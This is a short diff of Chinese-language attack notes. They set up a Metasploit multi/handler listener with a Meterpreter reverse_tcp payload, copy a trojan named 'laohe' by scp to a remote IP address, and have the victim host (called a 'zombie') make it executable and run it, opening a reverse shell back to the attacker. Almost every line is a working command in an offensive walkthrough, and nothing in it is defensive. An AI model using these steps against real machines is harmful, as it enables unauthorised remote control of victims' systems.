@@ -9,7 +9,17 @@ msf6 > use exploit/multi/handler
 msf6 exploit(multi/handler) > set LHOST 10.211.55.6
 msf6 exploit(multi/handler) > show options
 msf6 exploit(multi/handler) > set payload linux/x64/meterpreter/reverse_tcp
-payload
+payload需要换一下
 msf6 exploit(multi/handler) > run
 
 3.肉鸡执行木马
+网页下载木马，或者scp
+┌──(root💀kali-linux-2021-3)-[~]
+└─# cd /var/www/html                                                                                                                                                                                      
+┌──(root💀kali-linux-2021-3)-[/var/www/html]
+└─# scp laohe 47.112.144.203:~
+
+肉鸡执行：
+最好是centos、好像ubuntu不能执行
+chmod +x laohe
+./laohe
